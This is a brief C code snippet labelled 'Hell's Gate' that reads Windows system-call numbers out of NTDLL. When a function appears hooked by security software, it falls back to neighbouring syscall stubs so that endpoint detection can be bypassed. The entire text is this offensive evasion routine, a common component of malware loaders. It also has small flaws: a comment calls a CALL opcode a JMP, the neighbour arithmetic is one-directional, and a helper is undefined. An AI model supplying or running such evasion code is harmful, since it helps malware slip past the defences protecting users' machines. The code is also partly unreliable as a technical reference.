// Hell's Gate: Extract SSN from hooked NTDLL
DWORD GetSSN(PVOID funcAddr) {
    // Check if function is hooked (JMP instruction)
    if (*(BYTE*)funcAddr == 0xE8 || *(BYTE*)funcAddr == 0xE9) {
        // Function is hooked, need to find clean syscall
        // Traverse nearby syscalls and calculate offset
        for (int i = 1; i < 20; i++) {
            DWORD nearbySSN = GetSSNFromNeighbor(funcAddr, i);
            if (nearbySSN != -1) {
                return nearbySSN - i; // Calculate target SSN
            }
        }
    }
    // Extract SSN from syscall stub: mov eax, SSN
    return *(DWORD*)((BYTE*)funcAddr + 4);
}

